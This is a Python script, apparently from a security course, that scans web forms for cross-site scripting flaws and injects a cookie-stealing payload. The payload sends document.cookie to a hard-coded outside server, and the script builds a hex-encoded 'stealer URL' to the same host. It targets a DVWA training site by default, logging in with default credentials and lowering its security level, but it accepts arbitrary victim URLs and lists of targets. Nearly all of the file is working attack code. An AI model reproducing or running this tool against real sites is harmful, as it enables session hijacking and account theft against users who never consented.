from __future__ import print_function

import requests
import urllib
import mechanize
import sys
import argparse

from bs4 import BeautifulSoup
from six.moves import urllib

# URL where DVWA is hosted
DVWA_HOST = "http://dvwa.infosec.utexas.edu/"

# URL where the server is hosted (Cookie stealer server)
SERVER = "http://18.188.125.151"

def main():

    # Setup CMD arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("--verify", help = "Verify if a website is vulnerable to stored XSS")
    parser.add_argument("--url", help = "Url of victim site", type=str)
    parser.add_argument("--payload", help="Additional payload to be deployed if given")
    parser.add_argument("--inject", help="Inject payload")
    parser.add_argument("--targets", help="Path to file containing urls to target")
    parser.add_argument("--server", help="IP of the server to send stolen cookie to")

    args = parser.parse_args()

    browser = mechanize.Browser()
    browser.set_handle_robots(False)

    if args.server: 
        stealerIP = args.server
    else: 
        stealerIP = SERVER

    if args.payload:
        payload = args.payload
    else:
        if args.verify:
            payload = '&lt;script&gt;alert("vulnerable");&lt;/script&gt;'
        elif args.inject:
            payload = "<script>document.location=\""+stealerIP+"?cookie=\" + document.cookie;</script>" 

    if args.url:
        url = args.url

    if args.verify and args.verify.lower() in ["true", "t", "1"]:
        print("Scanning for XSS vulnerability...\n")

        if args.targets:
            target_path = args.targets
            with open(target_path) as f:
                for line in f:
                    browser = mechanize.Browser()
                    browser.set_handle_robots(False)
                    print("Target: " + line.strip("\n"))
                    verify(line, browser, payload)
        else:
            verify(url, browser, payload)

    if args.inject and args.inject.lower() in ["true", "t", "1"]:
        print("Injecting...\n")
        
        if args.targets:
            target_path = args.targets
            with open(target_path) as f:
                for line in f:
                    browser = mechanize.Browser()
                    browser.set_handle_robots(False)
                    print("Victim: " + line.strip("\n"))
                    inject(browser, payload, line)
        else:
            inject(browser, payload, url)

# Gets array of fields names for an html page on a given url
def getFieldNames(url, browser):
    try:
        text = browser.open(url).read()

        parseHTML = BeautifulSoup(text, 'html.parser')
        htmlForm = parseHTML.form
        if htmlForm != None:
            inputs = htmlForm.find_all('input')
        else:
            inputs = parseHTML.find_all('input')

        inputFieldNames = []
        for items in inputs:
            if items.has_attr('name'):
                inputFieldNames.append(items['name'])

        # print("Successfully return field names for url: " + str(url))

        return inputFieldNames
    except Exception as e:
        print("Failed to get field name for url: " + str(url))

def dvwaLogIn(browser, username = "admin", password = "password", url=DVWA_HOST):
    try:
        browser.open(url)
        browser.select_form(nr=0)
        browser.form['username'] = "admin"
        browser.form['password'] = "password"
        browser.submit()

        # print("Successfully logged into DVWA in url: " + str(url))

        return browser
    except Exception as e:
        print("Failed to log into DVWA")

def dvwaSetLevel(browser, security = "Low", url=DVWA_HOST):
    try:
        victim = url+"/security.php"
        browser.open(victim)
        browser.select_form(nr=0)
        browser.form["security"] = ["low"]
        browser.submit()
        # print("setting level")
        finalResult = browser.response().read()
        
        # print("Successfully set DVWA security level")

        return browser
    except Exception as e:
        print("Failed to set DVWA security level")

# Check if a website is vulnerable to stored XSS attacks
def verify(victim, browser, payload):
    try:
        if victim.strip("\n") == DVWA_HOST + "vulnerabilities/xss_s" or victim.strip("\n") == DVWA_HOST + "vulnerabilities/xss_r":
            browser = dvwaLogIn(browser = browser)
            browser = dvwaSetLevel(browser = browser)

        inputFieldNames = getFieldNames(victim, browser)
        browser.open(victim)

        finalResult = None
        if len(browser.forms()) > 0:
            browser.select_form(nr=0)

            possibleInputs = []
            for control in browser.form.controls:
                startIndx = str(control).find("(")
                endIndx = str(control).find("=")
                keyWord = str(control)[startIndx+1:endIndx]
                if keyWord != "submit" and keyWord != "<None>" and keyWord != 'btnSign' and keyWord != 'btnClear':
                    possibleInputs.append(keyWord)
            for inp in possibleInputs:
                browser.form[inp] = payload

            browser.submit()

            finalResult = browser.response().read()
        else:
            resp = urllib.request.urlopen(victim+"="+payload)
            body = resp.read()
            finalResult = body.decode('utf-8')

        # Naive way of checking by comparing html output before and after
        if finalResult.find(payload) != -1:
            redirect_url = browser.response().geturl()

            print("Reflective: Vulnerable")

            print("Stored: ", end="")

            # Reopen the origional URL to see if vulnerable to stored
            browser.open(victim)
            newResult = browser.response().read()

            if newResult.find(payload) != -1:
                print("Vulnerable\n")
            else:
                print("Not Vulnerable!\n")
        else:
            print("You are in good hands")
    except Exception as e:
        print("Not vulnerable!")

def inject(browser, payload, victim):
    try:
        if victim.strip() == "http://dvwa.infosec.utexas.edu/vulnerabilities/xss_r" or victim.strip() == "http://dvwa.infosec.utexas.edu/vulnerabilities/xss_s":
            browser = dvwaLogIn(browser = browser)
            browser = dvwaSetLevel(browser = browser)

            browser.open(victim)
            browser.select_form(nr=0)

            if victim.strip() == DVWA_HOST + "vulnerabilities/xss_s":
                browser.form['txtName']= "Grp15"
                browser.form['mtxMessage']= payload
            else:
                browser.form['name'] = payload
        else:
            browser.open(victim)
            browser.select_form(nr=0)

            possibleInputs = []
            for control in browser.form.controls:
                startIndx = str(control).find("(")
                endIndx = str(control).find("=")
                keyWord = str(control)[startIndx+1:endIndx]
                if keyWord != "submit" and keyWord != "<None>" and keyWord != 'btnSign' and keyWord != 'btnClear':
                    possibleInputs.append(keyWord)
            for inp in possibleInputs:
                browser.form[inp] = payload

        browser.submit()

        finalResult = browser.response().read()

        stealerURL = browser.response().geturl().split("=")
        if len(stealerURL) > 1:
            hexScript = "=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%31%38%2e%31%38%38%2e%31%32%35%2e%31%35%31%3f%63%6f%6f%6b%69%65%3d%22%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e"
            stealerURL = str(stealerURL[0]) + hexScript
            print("Stealer URL: " + str(stealerURL) + "\n")

        else: 
            print("Injected!!!\n")
    except Exception as e:
        print("Failed to inject. Most likely not vulnerable", e)

main()